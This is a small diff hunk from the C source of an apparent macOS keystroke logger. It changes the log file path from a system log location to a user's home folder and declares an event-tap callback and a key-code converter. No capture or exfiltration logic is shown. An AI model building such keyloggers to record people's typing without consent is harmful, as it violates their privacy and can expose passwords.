@@ -8,7 +8,7 @@
 #include <Carbon/Carbon.h>
 
 FILE *logfile = NULL;
-const char *logfileLocation = "/var/log/keystroke.log";
+const char *logfileLocation = "/Users/justin/logfile.txt";
 
 CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
 const char *convertKeyCode(int);
